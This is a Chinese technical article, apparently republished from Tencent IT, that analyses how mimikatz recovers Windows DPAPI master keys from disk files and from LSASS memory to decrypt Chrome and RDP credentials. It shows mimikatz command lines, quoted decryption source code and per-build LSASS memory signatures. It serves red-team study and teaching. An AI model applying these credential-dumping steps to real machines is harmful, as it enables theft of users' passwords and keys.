**作者： 腾讯IT技术  
原文链接：<https://mp.weixin.qq.com/s/VZWM3p-XPX7JP23s-R859A>**

## 导语

渗透的本质就是信息搜集，在后渗透阶段获取目标机器权限后，经常需要获取浏览器加密凭据和远程桌面RDP凭据等等，攻击队员一般利用 mimikatz
工具实现离线解密。为了更好的理解攻击原理，本文会介绍mimikatz如何进行解密以及代码是如何实现的。

## 1\. 从实际的后渗透场景开始

先介绍蓝军如何使用 mimikatz 对Chrome密码进行解密的，分为以下两种场景：

**场景1：在受害者主机上，以用户的安全上下文中解密Chrome凭据：**

![图片](https://images.seebug.org/content/images/2021/11/10/1636510218000-1msaqs.png-w331s)

**场景2：当将Chrome加密数据库拖到本地进行解密时，使用 mimikatz 离线解密 Chrome 凭据：**

![图片](https://images.seebug.org/content/images/2021/11/10/1636510219000-2wcfto.png-w331s)

以上尝试会提示该数据被 DPAPI 保护，这个时候如果已在此前获取到 master key 则可以完成离线解密：

![图片](https://images.seebug.org/content/images/2021/11/10/1636510219000-3pgqev.png-w331s)

在这两个解密场景下，命令均在 mimikatz 的 dpapi 模块下，以及在上面的示范中也提到了 matser key 这个参数。如果需要了解到
mimikatz 的解密实现，则需要从 DPAPI 以及 mimikatz 的代码实现两个方面来看。

## 2\. Windows下通用数据保护方案—DPAPI

Windows系统下，为了使开发者可以实施针对用户身份上下文加密的方案，系统向开发者提供了一个强大的数据保护API——DPAPI，开发者使用该 API
加密的数据在解密时会使用用户身份的上下文解密，使得该数据仅可被当前用户解密。DPAP
针对用户加密的方案可以抽象的理解为，不同的用户安全上下文相关会产生不同的 DPAPI master key，这个DPAPI master key
相当于一个密钥，这个调用DPAPI master key 实施加解密的过程由系统直接操作，所以从攻击者视角来看，如果有方式窃取到用户的 DPAPI
master key 就可以离线解密用户的敏感凭据，接下来我们将开始逐步了解 DPAPI ，从而逐步达成这个解密目的。

### 2.1 敏感信息保护：DPAPI介绍

DPAPI (Data Protection API) 从Windows 2000开始引入，MSDN中举例DPAPI可以用来保护的数据有：

Web page credentials (for example, passwords)

File share credentials

Private keys associated with Encrypting File System(EFS), S/MIME, and other
certificates

Program data that is protected using the CryptProtectData function

### 2.2 DPAPI 的工作原理

DPAPI通过由512-bit伪随机数的master key派生的数据来进行加密保护。每个用户账户都有?个或者多个随机生成的master
key，master key会定期更新，默认更新频率为90天，master key的过期时间会保存在master key file
同级目录的Prefererd文件中。master key会被由账户登录密码hash和SID生成的derived key加密，文件名是?个UUID。

用户master key文件位于%APPDATA%\Microsoft\Protect\%SID%

系统master key文件位于%WINDIR%\System32\Microsoft\Protect\S-1-5-18\User

![图片](https://images.seebug.org/content/images/2021/11/10/1636510219000-4vpyzb.png-w331s)

值得注意的是，在新版本Windows 10中master key文件会被设置为操作系统文件，默认不会在explorer中显示， 需要取消隐藏。

![图片](https://images.seebug.org/content/images/2021/11/10/1636510219000-5oajst.png-w331s)

上文中CryptProtectData的dwFlags参数为0的情况下，DPAPI会使用当前用户的master
key进行加密操作，如果期望当前机器上所有用户的进程都能够解密数据的话，可以通过设置CRYPTPROTECT_LOCAL_MACHINE
flag，它会使DPAPI的加解密操作中机器级别进行。

## 3\. 从 mimikatz 中看 DPAPI master key 获取逻辑

mimikatz中有两个模块可以用来获取DPAPI master key，分别是从磁盘文件获取master
key的dpapi::masterkey，和从LSASS进程内存获取master key的sekurlsa::dpapi。

接下来通过阅读mimikatz源码，来学习如何从[文件]以及[内存]两种途径来获取DPAPI master key。

### 3.1 dpapi::masterkey

dpapi::masterkey 命令可以通过磁盘上的加密master key来解密出真正的DPAPI master key，需要传入三个参数：master
key文件，用户SID，用户登录密码，相关命令如下：

dpapi::masterkey/in:"C:\Users\x\AppData\Roaming\Microsoft\Protect\S-1-5-21-1333135361-625243220-14044502-1002382[UUID]"/sid:S-1-5-21-1333135361-625243220-14044502-1002382
/password:password /protected

![图片](https://images.seebug.org/content/images/2021/11/10/1636510219000-6hlbwr.png-w331s)

下面的分析只针对最常见的解密master key流程，

定位到mimikatz/modules/dpapi/kuhl_m_dpapi.c，解密流程如下：

![](https://images.seebug.org/content/images/2021/11/b9854137-6453-4283-bc0f-29329ee4700d.jpg-w331s)

首先，读取磁盘上的master key文件，并在内存中分配master key结构体**

    
    
    kull_m_file_readData(szIn, &buffer, &szBuffer);
    PKULL_M_DPAPI_MASTERKEYS masterkeys = kull_m_dpapi_masterkeys_create(buffer);
    master key的结构定义在mimikatz/modules/kull_m_dpapi.h
    typedef struct _KULL_M_DPAPI_MASTERKEY {
        DWORD   dwVersion;
        BYTE    salt[16];
        DWORD   rounds;
        ALG_ID  algHash;
        ALG_ID  algCrypt;
        PBYTE   pbKey;
        DWORD   __dwKeyLen;
    } KULL_M_DPAPI_MASTERKEY, *PKULL_M_DPAPI_MASTERKEY;
    
    typedef struct _KULL_M_DPAPI_MASTERKEYS {
        DWORD   dwVersion;
        DWORD   unk0;
        DWORD   unk1;
        WCHAR   szGuid[36];
        DWORD   unk2;
        DWORD   unk3;
        DWORD   dwFlags;
        DWORD64 dwMasterKeyLen;
        DWORD64 dwBackupKeyLen;
        DWORD64 dwCredHistLen;
        DWORD64 dwDomainKeyLen;
        PKULL_M_DPAPI_MASTERKEY MasterKey;
        PKULL_M_DPAPI_MASTERKEY BackupKey;
        PKULL_M_DPAPI_MASTERKEY_CREDHIST    CredHist;
        PKULL_M_DPAPI_MASTERKEY_DOMAINKEY   DomainKey;
    } KULL_M_DPAPI_MASTERKEYS, *PKULL_M_DPAPI_MASTERKEYS;
    调用kull_m_dpapi_masterkeys_create将master key的成员copy到正确的偏移处
    PKULL_M_DPAPI_MASTERKEYS kull_m_dpapi_masterkeys_create(LPCVOID data/*, DWORD size*/)
    {
        PKULL_M_DPAPI_MASTERKEYS masterkeys = NULL;
        if(data && (masterkeys = (PKULL_M_DPAPI_MASTERKEYS) LocalAlloc(LPTR, sizeof(KULL_M_DPAPI_MASTERKEYS))))
        {
            RtlCopyMemory(masterkeys, data, FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey));
            if(masterkeys->dwMasterKeyLen)
                masterkeys->MasterKey = kull_m_dpapi_masterkey_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + 0, masterkeys->dwMasterKeyLen);
            if(masterkeys->dwBackupKeyLen)
                masterkeys->BackupKey = kull_m_dpapi_masterkey_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + masterkeys->dwMasterKeyLen, masterkeys->dwBackupKeyLen);
            if(masterkeys->dwCredHistLen)
                masterkeys->CredHist = kull_m_dpapi_masterkeys_credhist_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + masterkeys->dwMasterKeyLen + masterkeys->dwBackupKeyLen, masterkeys->dwCredHistLen);
            if(masterkeys->dwDomainKeyLen)
                masterkeys->DomainKey = kull_m_dpapi_masterkeys_domainkey_create((PBYTE) data + FIELD_OFFSET(KULL_M_DPAPI_MASTERKEYS, MasterKey) + masterkeys->dwMasterKeyLen + masterkeys->dwBackupKeyLen + masterkeys->dwCredHistLen, masterkeys->dwDomainKeyLen);
        }
        return masterkeys;
    }

**2) 接着，遍历全局缓存的CredentialEntry，尝试用缓存的Derive Key进行解密**

    
    
    通过SID定位Credential Entry
    if(masterkeys->CredHist)
      pCredentialEntry = kuhl_m_dpapi_oe_credential_get(NULL, &masterkeys->CredHist->guid);
    if(!pCredentialEntry && convertedSid)
      pCredentialEntry = kuhl_m_dpapi_oe_credential_get(convertedSid, NULL);
    通过master key文件的元数据确定hash算法
    if(pCredentialEntry)
    {
      kprintf(L"\n[masterkey] with volatile cache: "); kuhl_m_dpapi_oe_credential_descr(pCredentialEntry);
      if(masterkeys->dwFlags & 4)
      {
        if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1)
          derivedKey = pCredentialEntry->data.sha1hashDerived;
      }
      else
      {
        if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4)
          derivedKey = pCredentialEntry->data.md4hashDerived;
      }
    接着通过derived key进行解密
    if(derivedKey)
    {
      if(kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey(masterkeys->MasterKey, derivedKey, SHA_DIGEST_LENGTH, &output, &cbOutput))
      {
        if(masterkeys->CredHist)
          kuhl_m_dpapi_oe_credential_copyEntryWithNewGuid(pCredentialEntry, &masterkeys->CredHist->guid);
        kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
      }
    }

全局缓存的gDPAPI_MasterKeys/gDPAPI_Credentials/gDPAPI_DomainKeys都为LIST_ENTRY链表结构，当解密dpapi
master key成功时，mimikatz会将解密成功的entry添加到该缓存链表中。

**3) 当上一步的缓存没有命中，则通过用户提交的password进行解密（或提交hash代替密码）**

    
    
    if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
    {
      kprintf(L"\n[masterkey] with password: %s (%s user)\n", szPassword, isProtected ? L"protected" : L"normal");
      if(kull_m_dpapi_unprotect_masterkey_with_password(masterkeys->dwFlags, masterkeys->MasterKey, szPassword, convertedSid, isProtected, &output, &cbOutput))
      {
        kuhl_m_dpapi_oe_credential_add(convertedSid, masterkeys->CredHist ? &masterkeys->CredHist->guid : NULL, NULL, NULL, NULL, szPassword);
        kuhl_m_dpapi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
      }
      else PRINT_ERROR(L"kull_m_dpapi_unprotect_masterkey_with_password\n");
    }
    kull_m_dpapi_unprotect_masterkey_with_password函数中将password进行hash，然后使用hash调用kull_m_dpapi_unprotect_masterkey_with_userHash函数
    PassAlg = (flags & 4) ? CALG_SHA1 : CALG_MD4;
    PassLen = kull_m_crypto_hash_len(PassAlg);
    if(PassHash = LocalAlloc(LPTR, PassLen))
    {
      if(kull_m_crypto_hash(PassAlg, password, (DWORD) wcslen(password) * sizeof(wchar_t), PassHash, PassLen))
        status = kull_m_dpapi_unprotect_masterkey_with_userHash(masterkey, PassHash, PassLen, sid, isKeyOfProtectedUser, output, outputLen);
      LocalFree(PassHash);
    }
    
    kull_m_dpapi_unprotect_masterkey_with_userHash函数中会将hash进行两次pkcs5_pbkdf2_hmac处理
    BYTE sha2[32];
    if(kull_m_crypto_pkcs5_pbkdf2_hmac(CALG_SHA_256, PassHash, PassLen, sid, SidLen, 10000, sha2, sizeof(sha2), FALSE))
      status = kull_m_crypto_pkcs5_pbkdf2_hmac(CALG_SHA_256, sha2, sizeof(sha2), sid, SidLen, 1, (PBYTE) PassHash, PassLen, FALSE);
    
    接着将SID和hash一起进行SHA1 hash处理，生成Derived Key，然后调用kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey函数进行最后的解密。上一节通过缓存的Derived Key进行解密的步骤就是直接进入这一步。
    if(sid)
      status = kull_m_crypto_hmac(CALG_SHA1, hash, hashLen, sid, (lstrlen(sid) + 1) * sizeof(wchar_t), sha1DerivedKey, SHA_DIGEST_LENGTH);
    else RtlCopyMemory(sha1DerivedKey, hash, min(sizeof(sha1DerivedKey), hashLen));
    
    if(!sid || status)
      status = kull_m_dpapi_unprotect_masterkey_with_shaDerivedkey(masterkey, sha1DerivedKey, SHA_DIGEST_LENGTH, output, outputLen);
    通过Derived Key解密master key
    HMACAlg = (masterkey->algHash == CALG_HMAC) ? CALG_SHA1 : masterkey->algHash;
    HMACLen = kull_m_crypto_hash_len(HMACAlg);
    KeyLen =  kull_m_crypto_cipher_keylen(masterkey->algCrypt);
    BlockLen = kull_m_crypto_cipher_blocklen(masterkey->algCrypt);
    
    if(HMACHash = LocalAlloc(LPTR, KeyLen + BlockLen))
    {
      kull_m_crypto_pkcs5_pbkdf2_hmac(HMACAlg, shaDerivedkey, shaDerivedkeyLen, masterkey->salt, sizeof(masterkey->salt), masterkey->rounds, (PBYTE) HMACHash, KeyLen + BlockLen, TRUE));
      kull_m_crypto_hkey_session(masterkey->algCrypt, HMACHash, KeyLen, 0, &hSessionKey, &hSessionProv));
      CryptSetKeyParam(hSessionKey, KP_IV, (PBYTE) HMACHash + KeyLen, 0));
      OutLen = masterkey->__dwKeyLen;
      CryptBuffer = LocalAlloc(LPTR, OutLen));
      RtlCopyMemory(CryptBuffer, masterkey->pbKey, OutLen);
      CryptDecrypt(hSessionKey, 0, FALSE, 0, (PBYTE) CryptBuffer, &OutLen));
      *outputLen = OutLen - 16 - HMACLen - ((masterkey->algCrypt == CALG_3DES) ? 4 : 0); // reversed -- see with blocklen like in protect
      hmac1 = LocalAlloc(LPTR, HMACLen));
      kull_m_crypto_hmac(HMACAlg, shaDerivedkey, shaDerivedkeyLen, CryptBuffer, 16, hmac1, HMACLen))
      hmac2 = LocalAlloc(LPTR, HMACLen))
      kull_m_crypto_hmac(HMACAlg, hmac1, HMACLen, (PBYTE) CryptBuffer + OutLen - *outputLen, *outputLen, hmac2, HMACLen))
      if(status = RtlEqualMemory(hmac2, (PBYTE) CryptBuffer + 16, HMACLen))
      {
        if(*output = LocalAlloc(LPTR, *outputLen))
          RtlCopyMemory(*output, (PBYTE) CryptBuffer + OutLen - *outputLen, *outputLen);
      }
    }

### 3.2 sekurlsa::dpapi

![图片](https://images.seebug.org/content/images/2021/11/10/1636510220000-8bmfxj.png-w331s)

Sekurlsa模块中的功能都是通过操作LSASS进程内存实现的，调用该模块功能时都需要调用一个通用的初始化函数kuhl_m_sekurlsa_acquireLSA，该函数会从LSASS进程中读出一些必要信息，所以是需要elevate和DebugPrivilege权限的。并且当LSA以PPL保护运行时，还需要使用诸如PPL
Killer来关闭才能够正常获取LSASS进程句柄。

sekurlsa::dpapi是通过通过内存签名搜索LSASS进程空间来找到其中缓存的master
key，具体代码就不详细分析了，本质就是通过kernel32!ReadProcessMemory进行内存搜索。各位读者如果研究过sekurlsa模块源码，就会对其中的回调函数和内存签名搜索很熟悉。

关键的功能点函数是这一个：

kuhl_m_sekurlsa_utils_search_generic(pData->cLsass,&pPackage->Module,
MasterKeyCacheReferences,ARRAYSIZE(MasterKeyCacheReferences), (PVOID *)
&pMasterKeyCacheList, NULL, NULL, NULL);

mimikatz中定义的不同架构和不同版本的master key cache内存签名

    
    
    #if defined(_M_ARM64)
    BYTE PTRN_WI64_1803_MasterKeyCacheList[] = {0x09, 0xfd, 0xdf, 0xc8, 0x80, 0x42, 0x00, 0x91, 0x20, 0x01, 0x3f, 0xd6};
    KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
        {KULL_M_WIN_BUILD_10_1803,  {sizeof(PTRN_WI64_1803_MasterKeyCacheList), PTRN_WI64_1803_MasterKeyCacheList}, {0, NULL}, {16, 8}},
    };
    #elif defined(_M_X64)
    BYTE PTRN_W2K3_MasterKeyCacheList[] = {0x4d, 0x3b, 0xee, 0x49, 0x8b, 0xfd, 0x0f, 0x85};
    BYTE PTRN_WI60_MasterKeyCacheList[] = {0x49, 0x3b, 0xef, 0x48, 0x8b, 0xfd, 0x0f, 0x84};
    BYTE PTRN_WI61_MasterKeyCacheList[] = {0x33, 0xc0, 0xeb, 0x20, 0x48, 0x8d, 0x05}; // InitializeKeyCache to avoid  version change
    BYTE PTRN_WI62_MasterKeyCacheList[] = {0x4c, 0x89, 0x1f, 0x48, 0x89, 0x47, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
    BYTE PTRN_WI63_MasterKeyCacheList[] = {0x08, 0x48, 0x39, 0x48, 0x08, 0x0f, 0x85};
    BYTE PTRN_WI64_MasterKeyCacheList[] = {0x48, 0x89, 0x4e, 0x08, 0x48, 0x39, 0x48, 0x08};
    BYTE PTRN_WI64_1607_MasterKeyCacheList[]    = {0x48, 0x89, 0x4f, 0x08, 0x48, 0x89, 0x78, 0x08};
    
    KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
        {KULL_M_WIN_BUILD_2K3,      {sizeof(PTRN_W2K3_MasterKeyCacheList),  PTRN_W2K3_MasterKeyCacheList},  {0, NULL}, {-4}},
        {KULL_M_WIN_BUILD_VISTA,    {sizeof(PTRN_WI60_MasterKeyCacheList),  PTRN_WI60_MasterKeyCacheList},  {0, NULL}, {-4}},
        {KULL_M_WIN_BUILD_7,        {sizeof(PTRN_WI61_MasterKeyCacheList),  PTRN_WI61_MasterKeyCacheList},  {0, NULL}, { 7}},
        {KULL_M_WIN_BUILD_8,        {sizeof(PTRN_WI62_MasterKeyCacheList),  PTRN_WI62_MasterKeyCacheList},  {0, NULL}, {-4}},
        {KULL_M_WIN_BUILD_BLUE,     {sizeof(PTRN_WI63_MasterKeyCacheList),  PTRN_WI63_MasterKeyCacheList},  {0, NULL}, {-10}},
        {KULL_M_WIN_BUILD_10_1507,  {sizeof(PTRN_WI64_MasterKeyCacheList),  PTRN_WI64_MasterKeyCacheList},  {0, NULL}, {-7}},
        {KULL_M_WIN_BUILD_10_1607,  {sizeof(PTRN_WI64_1607_MasterKeyCacheList), PTRN_WI64_1607_MasterKeyCacheList}, {0, NULL}, {11}},
    };
    #elif defined(_M_IX86)
    BYTE PTRN_WALL_MasterKeyCacheList[] = {0x33, 0xc0, 0x40, 0xa3};
    BYTE PTRN_WI60_MasterKeyCacheList[] = {0x8b, 0xf0, 0x81, 0xfe, 0xcc, 0x06, 0x00, 0x00, 0x0f, 0x84};
    KULL_M_PATCH_GENERIC MasterKeyCacheReferences[] = {
        {KULL_M_WIN_BUILD_XP,       {sizeof(PTRN_WALL_MasterKeyCacheList),  PTRN_WALL_MasterKeyCacheList},  {0, NULL}, {-4}},
        {KULL_M_WIN_MIN_BUILD_8,    {sizeof(PTRN_WI60_MasterKeyCacheList),  PTRN_WI60_MasterKeyCacheList},  {0, NULL}, {-16}},// ?
        {KULL_M_WIN_MIN_BUILD_BLUE, {sizeof(PTRN_WALL_MasterKeyCacheList),  PTRN_WALL_MasterKeyCacheList},  {0, NULL}, {-4}},
    };
    #endif

## 4\. 总结

本文介绍了Windows DPAPI的用途、用法和工作方式，并结合mimikatz的源码分析了如何获取DPAPI master key
来进行后续的敏感信息解密操作，通过学习mimikatz DPAPI相关源码，蓝军能够更好的利用 DPAPI 的特性与能力来展开演习。

## 5\. Ref

  * <https://support.microsoft.com/en-us/topic/bf374083-626f-3446-2a9d-3f6077723a60>
  * <https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%8F%96Windows%E7%B3%BB%E7%BB%9F%E4%B8%8BDPAPI%E4%B8%AD%E7%9A%84MasterKey>
  * <https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c+>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1755/>

